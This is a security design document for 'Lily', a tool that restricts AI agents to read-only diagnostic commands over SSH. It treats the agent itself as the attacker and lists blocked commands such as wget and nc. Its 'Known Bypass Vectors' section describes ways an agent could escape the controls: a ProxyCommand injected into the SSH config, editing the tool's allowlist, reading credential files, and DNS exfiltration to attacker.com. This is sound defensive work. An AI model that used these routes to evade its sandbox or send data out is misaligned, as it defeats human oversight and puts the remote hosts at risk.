# Lily Security Model

This document describes Lily's security architecture, threat model,
and recommended deployment practices for running AI agents safely.

---

## Threat Model

**Attacker**: An AI agent (or compromised agent process) that attempts to
execute destructive or unauthorized operations on remote SSH hosts.

**Goal**: Allow only read-only diagnostic commands. Block everything that
could modify the remote system, escape validation, or exfiltrate data
beyond the tool's intended scope.

**Assumption**: The remote host runs a POSIX-compatible shell (bash, dash, zsh).
Commands are sent to the remote shell via `session.Run(command)`, meaning
the remote shell performs its own parsing and expansion.

---

## Command Execution Pipeline

```
┌─────────────────────────────────────────────────────────────────┐
│                     INPUT: Raw command string                    │
│                   "ps aux | grep nginx"                          │
└──────────────────────┬──────────────────────────────────────────┘
                       │
                       ▼
┌─────────────────────────────────────────────────────────────────┐
│  LAYER 1: Metacharacter Scanner                                 │
│  checkDangerousMetacharacters()                                 │
│                                                                 │
│  Quote-aware scan of the raw string. Tracks single/double quote │
│  state character-by-character.                                  │
│                                                                 │
│  BLOCKED (unquoted & double-quoted):                           │
│    • $()  — command substitution                                │
│    • ``   — backtick substitution                               │
│    • ${}  — parameter expansion                                 │
│    • $var — variable expansion ($ followed by [A-Za-z0-9_!@#])  │
│    • $((  — arithmetic expansion                                │
│    • ()   — subshells                                           │
│    • <>   — process substitution                                │
│    • <    — input redirection                                   │
│    • <<   — here-docs / here-strings                            │
│    • \x   — backslash escaping of shell-meaningful chars        │
│    • \n\r — newlines                                            │
│                                                                 │
│  SAFE inside single quotes: $('...') $('...') $('...')          │
│  Everything between matching '' is literal.                     │
│                                                                 │
│  FAIL-FAST: Returns error on first violation.                   │
└──────────────────────┬──────────────────────────────────────────┘
                       │ passes
                       ▼
┌─────────────────────────────────────────────────────────────────┐
│  LAYER 2: Redirection Scanner                                   │
│  containsUnquotedRedirection()                                  │
│                                                                 │
│  Quote-aware scan for unquoted > (covers >, >>, 2>, &>).       │
│  Input redirection (<) is already caught in Layer 1.            │
└──────────────────────┬──────────────────────────────────────────┘
                       │ passes
                       ▼
┌─────────────────────────────────────────────────────────────────┐
│  LAYER 3: Environment Assignment Scanner                        │
│  containsEnvAssignment()                                        │
│                                                                 │
│  Tokenizes the command and checks for VAR=value prefixes.       │
│  Blocks LD_PRELOAD, PAGER, PATH, and any other env injection.   │
│                                                                 │
│  Blocked: "FOO=bar cmd", "LD_PRELOAD=/tmp/x.so cmd"             │
└──────────────────────┬──────────────────────────────────────────┘
                       │ passes
                       ▼
┌─────────────────────────────────────────────────────────────────┐
│  LAYER 4: Pipeline Splitter                                     │
│  splitPipeline() / splitPipelineWithOps()                       │
│                                                                 │
│  Splits on |, ;, &&, || while respecting quotes.                │
│  Each segment is validated independently.                       │
│                                                                 │
│  "ps aux | grep nginx" → ["ps aux", "grep nginx"]              │
└──────────────────────┬──────────────────────────────────────────┘
                       │
                       ▼
┌─────────────────────────────────────────────────────────────────┐
│  LAYER 5: Per-Segment Validation                                │
│  (applied to each pipeline segment)                             │
│                                                                 │
│  5a. Command Extraction                                         │
│      extractBaseCommand() resolves /usr/bin/cmd → cmd           │
│                                                                 │
│  5b. Always-Block Check                                         │
│      Hardcoded blocklist: rm, sudo, bash, python, vi, chmod,    │
│      kill, shutdown, tee, wget, scp, crontab, etc.              │
│      Cannot be overridden by user config.                       │
│                                                                 │
│  5c. Allowlist Check                                            │
│      Base allowlist + user extras (minus always-blocked).        │
│      ~60 allowed commands.                                      │
│                                                                 │
│  5d. Blocked Flags Check                                        │
│      sed -i, curl -X/-d/-F/-o, find -exec/-execdir/-ok/-okdir  │
│      Uses prefix matching: "-x" blocks "-xanything"             │
│                                                                 │
│  5e. Subcommand Restrictions                                    │
│      systemctl: status, show, list-units, is-active, is-enabled │
│      dpkg: -l, --list, -s, --status                            │
│      rpm: -qa, -q                                               │
│      apt: list, show                                            │
│      pip: list, show                                            │
│      openssl: x509, verify, s_client, crl, version, ciphers,req│
│                                                                 │
│  5f. Argument Validators (command-specific deep inspection)     │
│      • xargs  — target command must be in allowlist             │
│      • awk    — blocks system(), pipe-to-cmd, coproc            │
│      • sed    — blocks w (write-to-file) including no-separator │
│      • curl   — blocks cloud metadata SSRF (169.254.x.x, etc.) │
│      • openssl — blocks req -new/-signkey, s_client -proxy      │
│                                                                 │
│      + rate limiter: enforces minimum interval between commands │
└──────────────────────┬──────────────────────────────────────────┘
                       │ all segments pass
                       ▼
┌─────────────────────────────────────────────────────────────────┐
│  LAYER 6: Command Sanitizer                                     │
│  SanitizeCommand()                                              │
│                                                                 │
│  Defense-in-depth: reconstructs the command with safe quoting.  │
│  All arguments are passed through shellQuote() which wraps      │
│  them in single quotes (the only 100% safe shell quoting).      │
│                                                                 │
│  If any argument contains unsafe chars, it gets single-quoted.  │
│  Inside single quotes, the shell treats EVERYTHING as literal.  │
│  The only special sequence is ' which is escaped as '\''        │
│                                                                 │
│  Pipeline operators (|, ;, &&, ||) are preserved between        │
│  reconstructed segments.                                        │
│                                                                 │
│  MUST be called AFTER ValidateCommand succeeds.                 │
└──────────────────────┬──────────────────────────────────────────┘
                       │
                       ▼
┌─────────────────────────────────────────────────────────────────┐
│  LAYER 7: SSH Transport (Trust On First Use)                    │
│  sshexec.Executor.Run()                                         │
│                                                                 │
│  • Host key verification via Trust On First Use (TOFU):        │
│    - First connection: host key is recorded in known_hosts      │
│    - Subsequent: key verified against recorded value            │
│    - Key mismatch: connection REJECTED (MITM protection)        │
│  • Authenticates via SSH agent or key files                     │
│  • Sends sanitized command via session.Run(command)              │
│  • Caps output at configurable limit (default 1 MB)             │
│  • Enforces configurable timeout (default 30s)                  │
│  • Returns stdout + stderr + exit code                          │
│                                                                 │
│  The sanitized command is sent as a string to the remote host's │
│  login shell. The sanitizer ensures the shell sees only the     │
│  intended tokens — no expansion, no substitution.               │
└─────────────────────────────────────────────────────────────────┘
```

---

## Defense-in-Depth Strategy

The system uses **three independent layers** that would each individually
prevent most attacks:

| Layer                  | Purpose                           | If Validator Has a Bug                                  |
| ---------------------- | --------------------------------- | ------------------------------------------------------- |
| Validator (Layers 1-5) | Block dangerous patterns          | —                                                       |
| Sanitizer (Layer 6)    | Rebuild command with safe quoting | **Neutralizes any token that passed through**           |
| Allowlist (Layer 5b-c) | Only known-safe commands          | **Even if shell is tricked, only allowed commands run** |

A successful attack requires **simultaneously**:

1. Bypassing the metacharacter scanner (Layer 1)
2. Using only allowlisted commands (Layer 5)
3. Crafting input where the sanitizer's output is still exploitable (Layer 6)

---

## Rate Limiting

Lily enforces a minimum interval between command executions to prevent
agents from flooding remote hosts. The default is **1 command per second**.

Configured in `lily.yaml`:

```yaml
rate_limit: "1s" # minimum interval between commands
max_output_bytes: 1048576 # 1 MB max output per command
```

The rate limiter applies to the `run_command` and `check_host` MCP tools.
It does not apply to read-only tools like `list_hosts`, `validate_command`,
or `list_allowed_commands` since those don't execute remote commands.

---

## Known Bypass Vectors

These are the realistic attack surfaces that a sandboxed agent **cannot**
exploit through Lily, but an **unsandboxed** agent could potentially attempt:

### 1. SSH Config Manipulation (requires filesystem access)

If the agent can write to `~/.ssh/config`, it could:

- Add a `ProxyCommand` that executes arbitrary code
- Change `HostName` to route through a malicious host
- Add `LocalForward`/`RemoteForward` for tunneling

**Mitigation**: Run the agent in a sandbox with no write access to `~/.ssh/`.

### 2. Config File Manipulation (requires filesystem access)

If the agent can write to `~/.config/lily/lily.yaml`, it could:

- Add arbitrary commands to the allowlist (except `alwaysBlocked` commands)
- Increase `max_output_bytes` to cause memory pressure
- Set `rate_limit: "0s"` to disable throttling

The agent **cannot** override hardcoded blocks (`rm`, `sudo`, `bash`, etc.)
even by editing the config file. But it could add tools like `nc`, `socat`,
or other commands that broaden the attack surface.

**Mitigation**: Mount the config file as read-only in the sandbox.

### 3. Raw SSH/curl Outside Lily (requires network access)

An unsandboxed agent could bypass Lily entirely and run `ssh`, `curl`,
`nc`, or other network tools directly.

**Mitigation**: Remove all network access from the sandbox. The only
network path should be via the Lily binary.

### 4. Information Disclosure via Allowed Commands

Commands like `cat /etc/shadow`, `cat /proc/self/environ`, or
`base64 /path/to/secret` can read sensitive data. This is by design —
Lily is a read-only diagnostic tool. The SSH user's file permissions
on the remote host are the access control boundary.

**Mitigation**: Use SSH user permissions, `authorized_keys` restrictions,
and dedicated read-only user accounts on remote hosts.

### 5. DNS Exfiltration via `dig`

An agent could encode data in DNS queries:

```bash
dig $(cat /etc/hostname).attacker.com
```

This is partially mitigated by `$()` being blocked. However, if the agent
knows a hostname, it could `dig known-secret.attacker.com` as a signal.

**Mitigation**: Network-level DNS monitoring on the remote host.

---

## Sandbox Deployment Guide

**Lily is designed to be run inside a sandboxed environment** where the
AI agent has no filesystem write access and no network access except via
the Lily binary itself. This section provides concrete setup guides.

### Why Sandboxing Matters

Lily's client-side validation is strong, but it's only one side of the
equation. Without sandboxing, an agent could:

1. Bypass Lily and run `ssh` directly
2. Modify `~/.ssh/config` to add proxy commands
3. Edit `~/.config/lily/lily.yaml` to add commands
4. Use `curl`/`wget` to exfiltrate data directly

Sandboxing closes all of these vectors.

---

### macOS / Linux ARM64 — Shuru

[Shuru](https://shuru.run) provides lightweight Linux microVMs using
Apple Virtualization.framework (macOS) and KVM (Linux ARM64).

#### Setup

1. Install shuru:

```bash
# macOS (Apple Silicon)
brew tap superhq-ai/tap && brew install shuru

# Linux ARM64
curl -fsSL https://shuru.run/install.sh | sh
```

2. Create a `shuru.json` in your project:

```json
{
  "cpus": 1,
  "memory": 512,
  "mounts": [
    "~/.ssh:/home/agent/.ssh:ro",
    "~/.config/lily:/home/agent/.config/lily:ro"
  ]
}
```

> **No `"network"` block.** Sandboxes are offline by default in shuru.
> The only network path is through the SSH keys mounted read-only, which
> the Lily binary uses to reach remote hosts.

3. Install Lily inside the sandbox:

```bash
shuru run -- sh -c 'curl -fsSL https://example.com/lily/install | sh'
# Or mount the binary directly:
shuru run --mount ./bin/lily:/usr/local/bin/lily:ro -- lily hosts
```

4. Run the agent inside the sandbox:

```bash
shuru run --mount ./bin/lily:/usr/local/bin/lily:ro -- your-agent-command
```

#### Key Restrictions

| Resource              | Setting                 | Why                            |
| --------------------- | ----------------------- | ------------------------------ |
| Network               | Offline (default)       | Agent can't SSH/curl directly  |
| `~/.ssh/`             | Read-only mount         | Agent can't modify SSH config  |
| `lily.yaml`           | Read-only mount         | Agent can't edit allowlist     |
| `/usr/local/bin/lily` | Read-only mount         | Agent can't replace the binary |
| Memory/CPU            | Minimal (512 MB, 1 CPU) | Contain resource usage         |

---

### Linux AMD64 — vmsan

[vmsan](https://vmsan.dev) provides Firecracker microVMs with per-VM
network namespaces, seccomp-bpf filters, and cgroup resource limits.

#### Setup

1. Install vmsan and prerequisites:

```bash
curl -fsSL https://vmsan.dev/install | bash
vmsan doctor  # verify KVM, disk space, binaries
```

2. Create an isolated VM with no network access:

```bash
vmsan create \
  --vcpus 1 \
  --memory 256 \
  --disk 5gb \
  --network-policy deny-all \
  --timeout 2h
```

3. Upload the Lily binary and config:

```bash
VM_ID=$(vmsan ls --json | jq -r '.[0].id')

# Upload binary
vmsan upload "$VM_ID" ./bin/lily

# Upload config (read-only in the VM)
vmsan upload "$VM_ID" ./lily.yaml
# Place it: vmsan exec "$VM_ID" -- mkdir -p /root/.config/lily
# vmsan exec "$VM_ID" -- mv /root/lily.yaml /root/.config/lily/lily.yaml
```

4. Upload SSH keys (agent needs these to reach remote hosts):

```bash
# Mount SSH directory as read-only
vmsan upload "$VM_ID" ~/.ssh/config   # SSH config
vmsan upload "$VM_ID" ~/.ssh/known_hosts
# Keys are accessed via SSH_AUTH_SOCK or uploaded as needed
```

5. Run the agent inside the VM:

```bash
vmsan exec "$VM_ID" -- your-agent-command
```

#### Key Restrictions

| Resource    | Flag                        | Effect                          |
| ----------- | --------------------------- | ------------------------------- |
| Network     | `--network-policy deny-all` | No outbound from VM             |
| seccomp-bpf | Enabled by default          | Restricts syscalls              |
| PID ns      | Enabled by default          | Process isolation               |
| cgroups     | Enabled by default          | Memory/CPU limits               |
| Timeout     | `--timeout 2h`              | Auto-shutdown after idle period |

> **Note on network access**: With `--network-policy deny-all`, the VM
> has no network access at all. You'll need to either use `--network-policy custom`
> with `--allowed-cidr` to allow only SSH traffic to your hosts, or use
> port forwarding via `--publish-port` for specific connections.

#### Custom Network Policy (allow SSH only)

```bash
vmsan create \
  --vcpus 1 \
  --memory 256 \
  --network-policy custom \
  --allowed-cidr "10.0.0.0/8" \
  --allowed-cidr "192.168.0.0/16" \
  --denied-cidr "169.254.0.0/16" \
  --denied-cidr "100.100.0.0/16" \
  --timeout 2h
```

This allows SSH to internal hosts while blocking cloud metadata endpoints.

---

## Configuration Reference

All settings live in `~/.config/lily/lily.yaml`. The file is created
automatically by `lily install-skill` if it doesn't exist.

### Execution Limits

```yaml
# Minimum interval between command executions.
# Prevents agents from flooding hosts with rapid-fire commands.
# Default: "1s"
rate_limit: "1s"

# Maximum output (stdout + stderr) captured per command, in bytes.
# Output beyond this limit is silently truncated.
# Default: 1048576 (1 MB). Minimum: 1024 (1 KB).
max_output_bytes: 1048576
```

### Command Allowlist

```yaml
# Extra commands beyond the ~60 built-in allowed commands.
# Still subject to metacharacter checks and subcommand restrictions.
extra_commands:
  - docker
  - kubectl

# Restrict which subcommands are allowed for extra commands.
extra_subcommand_restrictions:
  docker:
    - ps
    - logs
    - inspect
  kubectl:
    - get
    - describe
    - logs

# Block specific flags for any command (built-in or extra).
extra_blocked_flags:
  docker:
    - exec
    - run
```

### What Config Cannot Override

The following are **hardcoded** and cannot be changed via config:

- **Always-blocked commands**: `rm`, `sudo`, `bash`, `sh`, `python`, `perl`,
  `ruby`, `node`, `vi`, `vim`, `nano`, `emacs`, `chmod`, `chown`, `kill`,
  `shutdown`, `reboot`, `tee`, `wget`, `scp`, `rsync`, `crontab`, `make`,
  `gcc`, `iptables`, and 30+ more.

- **Always-blocked metacharacters**: `$()`, backticks, `${}`, `$var`,
  `>`, `>>`, `<`, `<<`, `()`, newlines, process substitution.

- **Always-blocked subcommands**: `systemctl start/stop/restart`,
  `apt install/remove`, `pip install/uninstall`, etc.

Even if an agent edits `lily.yaml` to add `rm` to `extra_commands`, it is
silently ignored during validation.

---

## Summary: Recommended Deployment

For maximum security when giving AI agents access to remote hosts:

```
┌──────────────────────────────────────────────────────────────┐
│  Sandbox (shuru / vmsan)                                     │
│                                                              │
│  ┌─────────────┐    ┌──────────┐    ┌──────────────────┐   │
│  │  AI Agent   │───▶│ Lily CLI │───▶│ SSH to Remote    │   │
│  │             │    │          │    │ Hosts             │   │
│  │ No network  │    │ Validates│    │                  │   │
│  │ No SSH dir  │    │ Sanitizes│    │ Read-only cmds   │   │
│  │ No curl     │    │ Rate lim │    │ only             │   │
│  └─────────────┘    └──────────┘    └──────────────────┘   │
│         │                  │                                 │
│    read-only         read-only                              │
│    lily.yaml         ~/.ssh/                                │
│                                                              │
│  ❌ No raw SSH, curl, wget, nc                              │
│  ❌ No write access to ~/.ssh/ or lily.yaml                 │
│  ❌ No outbound network (except via Lily SSH)               │
└──────────────────────────────────────────────────────────────┘
```

The combination of Lily's validation + sanitization pipeline and a properly
configured sandbox creates a defense-in-depth posture where:

1. The agent **cannot** send destructive commands (Lily blocks them)
2. The agent **cannot** bypass Lily and SSH directly (sandbox blocks network)
3. The agent **cannot** modify SSH config or Lily config (read-only mounts)
4. The agent **cannot** flood hosts (rate limiter caps command frequency)
5. The agent **cannot** exfiltrate via SSRF (cloud metadata IPs blocked)
6. The agent **cannot** MITM connections (TOFU host key verification)

---

## Testing

All security checks have regression tests in `internal/readonly/validate_test.go`.

```bash
go test ./internal/readonly/ -count=1 -v
```
